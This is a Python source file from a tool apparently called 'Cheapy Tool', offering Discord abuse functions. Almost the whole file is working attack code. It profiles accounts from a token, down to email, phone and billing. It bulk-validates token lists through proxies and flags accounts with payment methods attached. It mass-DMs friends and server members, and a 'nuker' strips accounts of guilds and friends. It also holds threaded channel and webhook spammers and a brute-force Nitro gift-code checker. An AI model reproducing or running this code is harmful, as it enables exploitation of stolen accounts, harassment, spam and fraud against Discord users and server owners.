from __future__ import annotations

import json
import random
import string
import sys
import threading
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

import requests

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from config import *


class DiscordModule:
    """Cheapy Tool Discord tools by psixakias.7."""

    API = "https://discord.com/api/v9"

    # ──────────────────────────────────────────────
    #  Token Info (full details)
    # ──────────────────────────────────────────────
    def token_info(self):
        token = get_input("Discord token")
        headers = {"Authorization": token, "Content-Type": "application/json"}

        wait_msg("Fetching user info...")
        try:
            r = requests.get(f"{self.API}/users/@me", headers=headers, timeout=10)
            if r.status_code != 200:
                error_then_exit(f"Token invalid (HTTP {r.status_code})")

            user = r.json()
            user_id = user.get("id", "N/A")

            section_header("Discord Token Info")
            table = make_table("Property", "Value")

            status = "Valid" if r.status_code == 200 else "Invalid"
            table.add_row(Text("Status", style=Theme.accent), Text(status, style=Theme.success if status == "Valid" else Theme.error))

            username = f'{user.get("username", "N/A")}#{user.get("discriminator", "N/A")}'
            table.add_row(Text("Username", style=Theme.accent), Text(username, style=Theme.secondary))
            table.add_row(Text("Display Name", style=Theme.accent), Text(str(user.get("global_name", "N/A")), style=Theme.secondary))
            table.add_row(Text("ID", style=Theme.accent), Text(user_id, style=Theme.secondary))
            table.add_row(Text("Email", style=Theme.accent), Text(str(user.get("email", "N/A")), style=Theme.secondary))
            table.add_row(Text("Phone", style=Theme.accent), Text(str(user.get("phone", "N/A")), style=Theme.secondary))
            table.add_row(Text("MFA", style=Theme.accent), Text(str(user.get("mfa_enabled", "N/A")), style=Theme.secondary))
            table.add_row(Text("Locale", style=Theme.accent), Text(str(user.get("locale", "N/A")), style=Theme.secondary))
            table.add_row(Text("Verified", style=Theme.accent), Text(str(user.get("verified", "N/A")), style=Theme.secondary))

            # Nitro
            nitro_map = {0: "None", 1: "Nitro Classic", 2: "Nitro Boost", 3: "Nitro Basic"}
            table.add_row(Text("Nitro", style=Theme.accent), nitro_map.get(user.get("premium_type", 0), "Unknown"))

            # Created at
            snowflake = int(user_id)
            created_ts = ((snowflake >> 22) + 1420070400000) / 1000
            created = datetime.fromtimestamp(created_ts, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
            table.add_row(Text("Created At", style=Theme.accent), Text(created, style=Theme.secondary))

            # Avatar
            avatar = user.get("avatar")
            if avatar:
                avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}.{'gif' if avatar.startswith('a_') else 'png'}"
                table.add_row(Text("Avatar URL", style=Theme.accent), Text(avatar_url, style=Theme.secondary))

            console.print(table)

            # Guilds
            wait_msg("Fetching guilds...")
            try:
                g = requests.get(f"{self.API}/users/@me/guilds?with_counts=true", headers=headers, timeout=10)
                if g.status_code == 200:
                    guilds = g.json()
                    owned = [gu for gu in guilds if gu.get("owner")]
                    info(f"Guilds: {len(guilds)} (Owned: {len(owned)})")
                    if owned:
                        for gu in owned[:5]:
                            console.print(f"  [{Theme.accent}]Owner of:[/] {gu['name']} ({gu['id']})")
            except Exception:
                pass

            # Billing
            try:
                b = requests.get(f"{self.API}/v6/users/@me/billing/payment-sources", headers=headers, timeout=10)
                if b.status_code == 200:
                    methods = b.json()
                    if methods:
                        names = {1: "CB", 2: "PayPal"}
                        method_str = " / ".join(names.get(m.get("type"), "Other") for m in methods)
                        info(f"Billing: {method_str}")
            except Exception:
                pass

        except requests.exceptions.RequestException as e:
            error_then_exit(f"Request error: {e}")
        pause()

    # ──────────────────────────────────────────────
    #  Token Checker (multi-threaded)
    # ──────────────────────────────────────────────
    def token_checker(self):
        tokens_input = get_input("Tokens (comma-separated or paste list)")
        tokens = [t.strip() for t in tokens_input.replace("\n", ",").split(",") if t.strip()]

        if not tokens:
            error_then_exit("No tokens provided.")

        max_workers = get_input("Threads", "10")
        try:
            max_workers = int(max_workers)
        except ValueError:
            max_workers = 10

        use_proxies = confirm("Use proxies?")
        proxies = []
        if use_proxies:
            proxy_input = get_input("Proxies (comma-separated host:port)")
            proxies = [p.strip() for p in proxy_input.split(",") if p.strip()]

        valid: list[str] = []
        invalid: list[str] = []
        locked: list[str] = []
        billing: list[str] = []

        from concurrent.futures import ThreadPoolExecutor, as_completed

        def _check(t: str) -> dict:
            headers = {"Authorization": t}
            if proxies:
                p = random.choice(proxies)
                proxies_dict = {"http": f"http://{p}", "https": f"http://{p}"}
            else:
                proxies_dict = None

            try:
                r = requests.get(f"{self.API}/users/@me", headers=headers, proxies=proxies_dict, timeout=10)
                status = r.status_code
                result: dict[str, Any] = {"token": t, "status": status}

                if status == 200:
                    user = r.json()
                    result["valid"] = True
                    result["username"] = user.get("username", "?")
                    result["email"] = user.get("email", "")
                    result["phone"] = user.get("phone", "")
                    result["nitro"] = user.get("premium_type", 0) > 0

                    # Check billing
                    try:
                        b = requests.get(f"{self.API}/v6/users/@me/billing/payment-sources", headers=headers, proxies=proxies_dict, timeout=5)
                        result["billing"] = b.status_code == 200 and len(b.json()) > 0
                    except Exception:
                        result["billing"] = False
                elif status == 403:
                    result["locked"] = True
                else:
                    result["valid"] = False

                return result
            except Exception as e:
                return {"token": t, "error": str(e)}

        progress_table = make_table("Status", "Token", "Info")
        with Live(progress_table, console=console, refresh_per_second=2):
            with ThreadPoolExecutor(max_workers=max_workers) as pool:
                futs = {pool.submit(_check, t): t for t in tokens}
                for fut in as_completed(futs):
                    try:
                        res = fut.result()
                        tok = res.get("token", "???")[:30]
                        if res.get("valid"):
                            valid.append(tok)
                            extra = res.get("username", "?")
                            if res.get("billing"):
                                extra += " [BILLING]"
                            progress_table.add_row(Text("VALID", style=Theme.success), Text(tok, style=Theme.secondary), Text(extra, style=Theme.accent))
                        elif res.get("locked"):
                            locked.append(tok)
                            progress_table.add_row(Text("LOCKED", style=Theme.warning), Text(tok, style=Theme.secondary), Text("Phone locked", style=Theme.warning))
                        else:
                            invalid.append(tok)
                            progress_table.add_row(Text("INVALID", style=Theme.error), Text(tok, style=Theme.secondary), Text("", style=Theme.muted))
                    except Exception:
                        pass

        console.print()
        section_header("Results")
        info(f"Valid: {len(valid)} | Invalid: {len(invalid)} | Locked: {len(locked)} | Billing: {len(billing)}")
        pause()

    # ──────────────────────────────────────────────
    #  DM All (friends / open DMs / server)
    # ──────────────────────────────────────────────
    def dm_all(self):
        token = get_input("Discord token")
        headers = {"Authorization": token, "Content-Type": "application/json"}

        mode = get_input("Mode (friends / open / server)", "friends")
        message = get_input("Message ({user} for mention)", "Hello {user}!")

        def _send_dm(user_id: str, username: str) -> bool:
            try:
                ch = requests.post(f"{self.API}/users/@me/channels", headers=headers, json={"recipient_id": user_id}, timeout=10)
                if ch.status_code != 200:
                    return False
                channel_id = ch.json()["id"]
                msg_content = message.replace("{user}", f"<@{user_id}>")
                r = requests.post(f"{self.API}/channels/{channel_id}/messages", headers=headers, json={"content": msg_content}, timeout=10)
                return r.status_code == 200
            except Exception:
                return False

        match mode:
            case "friends":
                try:
                    r = requests.get(f"{self.API}/users/@me/relationships", headers=headers, timeout=10)
                    if r.status_code != 200:
                        error_then_exit("Failed to fetch friends.")
                    friends = r.json()
                    sent = 0
                    for friend in friends:
                        if friend.get("type") in (64, 128, 256, 1048704):
                            continue
                        user = friend.get("user", {})
                        uid = user.get("id")
                        name = user.get("username", "?")
                        if uid and _send_dm(uid, name):
                            sent += 1
                            success(f"Sent to {name}")
                        time.sleep(0.5)
                    info(f"Sent to {sent}/{len(friends)} friends")
                except Exception as e:
                    error(f"Error: {e}")

            case "open":
                try:
                    r = requests.get(f"{self.API}/users/@me/channels", headers=headers, timeout=10)
                    if r.status_code != 200:
                        error_then_exit("Failed to fetch DMs.")
                    dms = r.json()
                    sent = 0
                    for dm in dms:
                        if dm.get("type") != 1:
                            continue
                        recipients = dm.get("recipients", [])
                        if not recipients:
                            continue
                        uid = recipients[0].get("id")
                        name = recipients[0].get("username", "?")
                        msg_content = message.replace("{user}", f"<@{uid}>")
                        try:
                            mr = requests.post(f"{self.API}/channels/{dm['id']}/messages", headers=headers, json={"content": msg_content}, timeout=10)
                            if mr.status_code == 200:
                                sent += 1
                                success(f"Sent to {name}")
                        except Exception:
                            pass
                        time.sleep(0.5)
                    info(f"Sent to {sent}/{len(dms)} DMs")
                except Exception as e:
                    error(f"Error: {e}")

            case "server":
                server_id = get_input("Server ID")
                bot_token = get_input("Bot token (leave blank for same)")
                if bot_token:
                    headers = {"Authorization": f"Bot {bot_token}", "Content-Type": "application/json"}

                try:
                    r = requests.get(f"{self.API}/guilds/{server_id}/members?limit=1000", headers=headers, timeout=10)
                    if r.status_code != 200:
                        error_then_exit("Failed to fetch members.")
                    members = r.json()
                    sent = 0
                    for member in members:
                        user = member.get("user", {})
                        uid = user.get("id")
                        name = user.get("username", "?")
                        if uid and _send_dm(uid, name):
                            sent += 1
                            success(f"Sent to {name}")
                        time.sleep(0.3)
                    info(f"Sent to {sent}/{len(members)} members")
                except Exception as e:
                    error(f"Error: {e}")
        pause()

    # ──────────────────────────────────────────────
    #  Token Nuker
    # ──────────────────────────────────────────────
    def token_nuker(self):
        token = get_input("Discord token")
        headers = {"Authorization": token, "Content-Type": "application/json"}

        section_header("Token Nuker")

        # Change status
        if confirm("Change online status to invisible?"):
            try:
                requests.patch(f"{self.API}/users/@me/settings", headers=headers, json={"status": "invisible"}, timeout=10)
                success("Status set to invisible")
            except Exception as e:
                error(f"Status: {e}")

        # Change theme
        if confirm("Change theme to dark?"):
            try:
                requests.patch(f"{self.API}/users/@me/settings", headers=headers, json={"theme": "dark"}, timeout=10)
                success("Theme set to dark")
            except Exception as e:
                error(f"Theme: {e}")

        # Change language
        if confirm("Change language to pirate English?"):
            try:
                requests.patch(f"{self.API}/users/@me/settings", headers=headers, json={"locale": "en-Pirate"}, timeout=10)
                success("Language set to pirate!")
            except Exception as e:
                error(f"Language: {e}")

        # Leave all guilds
        if confirm("Leave all guilds?"):
            try:
                r = requests.get(f"{self.API}/users/@me/guilds?with_counts=true", headers=headers, timeout=10)
                if r.status_code == 200:
                    for guild in r.json():
                        if not guild.get("owner"):
                            try:
                                requests.delete(f"{self.API}/users/@me/guilds/{guild['id']}", headers=headers, timeout=10)
                                info(f"Left: {guild['name']}")
                            except Exception:
                                pass
            except Exception as e:
                error(f"Guild leave: {e}")

        # Delete all relationships
        if confirm("Remove all friends?"):
            try:
                r = requests.get(f"{self.API}/users/@me/relationships", headers=headers, timeout=10)
                if r.status_code == 200:
                    for rel in r.json():
                        try:
                            requests.delete(f"{self.API}/users/@me/relationships/{rel['id']}", headers=headers, timeout=10)
                            info(f"Removed: {rel.get('user', {}).get('username', '?')}")
                        except Exception:
                            pass
            except Exception as e:
                error(f"Friends: {e}")

        info("Nuking complete.")
        pause()

    # ──────────────────────────────────────────────
    #  Token Raid (channel spammer)
    # ──────────────────────────────────────────────
    def token_raid(self):
        token = get_input("Discord token")
        channel_id = get_input("Channel ID")
        message = get_input("Message to spam")
        count = get_input("Number of messages", "10")
        try:
            count = int(count)
        except ValueError:
            count = 10

        threads = get_input("Threads", "5")
        try:
            threads = int(threads)
        except ValueError:
            threads = 5

        headers = {"Authorization": token, "Content-Type": "application/json"}

        def _spam():
            for _ in range(count // threads + 1):
                try:
                    requests.post(f"{self.API}/channels/{channel_id}/messages", headers=headers, json={"content": message}, timeout=5)
                except Exception:
                    pass

        wait_msg(f"Spamming {count} messages with {threads} threads...")
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=_spam, daemon=True)
            t.start()
            thread_list.append(t)
        for t in thread_list:
            t.join(timeout=30)
        info("Raid complete.")
        pause()

    # ──────────────────────────────────────────────
    #  Webhook Tools (info + spammer)
    # ──────────────────────────────────────────────
    def webhook_tools(self):
        webhook = get_input("Webhook URL")

        section_header("Webhook Tools")

        if confirm("Get webhook info?"):
            try:
                r = requests.get(webhook, timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    table = make_table("Property", "Value")
                    table.add_row(Text("Name", style=Theme.accent), Text(data.get("name", "N/A"), style=Theme.secondary))
                    table.add_row(Text("Channel ID", style=Theme.accent), Text(str(data.get("channel_id", "N/A")), style=Theme.secondary))
                    table.add_row(Text("Guild ID", style=Theme.accent), Text(str(data.get("guild_id", "N/A")), style=Theme.secondary))
                    table.add_row(Text("Token", style=Theme.accent), Text(str(data.get("token", "N/A"))[:20] + "...", style=Theme.secondary))
                    console.print(table)
                else:
                    error(f"HTTP {r.status_code}")
            except Exception as e:
                error(f"Error: {e}")

        if confirm("Send test message?"):
            content = get_input("Message content", "Hello from Cheapy Tool!")
            try:
                r = requests.post(webhook, json={"content": content}, timeout=10)
                if r.status_code == 204:
                    success("Message sent!")
                else:
                    error(f"HTTP {r.status_code}")
            except Exception as e:
                error(f"Error: {e}")

        if confirm("Spam webhook?"):
            count = get_input("Number of messages", "50")
            try:
                count = int(count)
            except ValueError:
                count = 50
            c = get_input("Threads", "10")
            try:
                threads = int(c)
            except ValueError:
                threads = 10

            def _spam():
                for _ in range(count // threads + 1):
                    try:
                        requests.post(webhook, json={"content": random.choice(["@everyone SPAM", "CHEAPY TOOL", "RAIDED", "LOL"])}, timeout=5)
                    except Exception:
                        pass

            thread_list = []
            for _ in range(threads):
                t = threading.Thread(target=_spam, daemon=True)
                t.start()
                thread_list.append(t)
            for t in thread_list:
                t.join(timeout=60)
            info("Webhook spam complete.")
        pause()

    # ──────────────────────────────────────────────
    #  Nitro Generator & Checker
    # ──────────────────────────────────────────────
    def nitro_generator(self):
        num_codes = get_input("Number of codes to generate", "100")
        try:
            num_codes = int(num_codes)
        except ValueError:
            num_codes = 100

        threads = get_input("Threads", "10")
        try:
            threads = int(threads)
        except ValueError:
            threads = 10

        def _gen() -> str:
            return ''.join(random.choices(string.ascii_letters + string.digits, k=16))

        def _check(code: str) -> tuple[str, bool]:
            try:
                r = requests.get(f"https://discord.com/api/v9/entitlements/gift-codes/{code}", timeout=5)
                return (code, r.status_code == 200)
            except Exception:
                return (code, False)

        from concurrent.futures import ThreadPoolExecutor, as_completed

        codes = [_gen() for _ in range(num_codes)]
        valid_codes: list[str] = []

        progress_table = make_table("Status", "Code")
        with Live(progress_table, console=console, refresh_per_second=2):
            with ThreadPoolExecutor(max_workers=threads) as pool:
                futs = {pool.submit(_check, c): c for c in codes}
                for fut in as_completed(futs):
                    code, valid = fut.result()
                    if valid:
                        valid_codes.append(code)
                        progress_table.add_row(Text("VALID!", style=Theme.success), Text(f"discord.gift/{code}", style=Theme.accent))
                    else:
                        progress_table.add_row(Text("invalid", style=Theme.muted), Text(code[:20] + "...", style=Theme.muted))

        section_header("Nitro Generator")
        if valid_codes:
            success(f"Found {len(valid_codes)} valid code(s)!")
            for code in valid_codes:
                console.print(f"  [{Theme.success}]+[/] https://discord.gift/{code}")
        else:
            warning("No valid codes found.")
        pause()
